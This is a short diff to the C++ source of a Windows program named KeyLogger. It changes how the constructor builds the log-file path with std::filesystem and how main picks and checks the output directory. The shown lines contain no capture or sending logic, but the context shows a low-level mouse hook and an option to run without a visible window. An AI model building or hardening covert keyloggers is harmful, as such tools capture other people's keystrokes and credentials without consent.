@@ -232,8 +232,8 @@ public:
 	// Constructor
 	// dynamic memory allocation for 'logfile_name_' done directly in initializer list.
 	// no need to release memory, std::string takes care of this.
-	KeyLogger(const char* output_dir, bool visible = false)
-		:logfile_name_(std::string(output_dir) + std::string("logfile.log")), visible(visible)
+	KeyLogger(std::string output_dir, bool visible = false)
+		:logfile_name_((output_dir / std::filesystem::path ("logfile.log")).string()), visible(visible)
 	{	
 		this->mouse_direction_modifier = 1; // direction - right
 		if (this->visible) {
@@ -348,20 +348,20 @@ LRESULT CALLBACK KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LP
 int main(int argc, char* argv[])
 {
 	// output_dir defaults to current directory, if not specified.
-	const char* output_dir= "/.";
+	//const char* output_dir = std::filesystem::current_path().string();
+	std::string output_dir = std::filesystem::current_path().string();
+
 	if (argc > 1)
 	{
 		output_dir = argv[1];
 	}
 
 	// input validataion of cmdline args
-	std::filesystem::path p(argv[1]);
-	if (!(std::filesystem::exists(p) && std::filesystem::is_directory(p))) {
-		std::cerr << p << " - is not a valid directory." << std::endl;
+	if (!(std::filesystem::exists(output_dir) && std::filesystem::is_directory(output_dir))) {
+		std::cerr << output_dir << " - is not a valid directory." << std::endl;
 		std::cerr << "Usage:\r\n" << argv[0] << " <output_directory>" << std::endl;
 		return 1;
 	}
-
 	KeyLogger_obj = new KeyLogger(output_dir, 1);
 
 	// loop to keep the console application running.
